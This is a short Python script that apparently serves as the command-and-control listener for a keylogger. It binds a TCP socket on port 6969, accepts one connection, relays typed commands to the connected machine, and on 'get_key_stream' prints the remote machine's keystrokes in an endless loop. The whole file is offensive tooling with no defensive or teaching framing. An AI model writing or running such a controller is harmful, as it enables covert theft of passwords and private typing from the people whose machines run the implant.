import socket



class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("\n[+] Waiting for Connection.")
        self.conn, addr =  listener.accept()
        print(f"\n[+] Got a Connection - {addr}")
        self.receive = False


    def run(self):
        while True:
            if not self.receive:
                key = input("KEY>> ")
                self.receive = True
                if key != 'get_key_stream':
                    self.conn.send(key.encode())
                    if self.receive:
                        message = self.conn.recv(3048).decode()
                        print(message)
                elif key == 'get_key_stream':
                    self.conn.send(key.encode())
                    self.receive = True
                    while True:
                        key_pressed = self.conn.recv(3048).decode()
                        print(key_pressed)

            



listener = Listener(socket.gethostbyname(socket.gethostname()), 6969)
listener.run()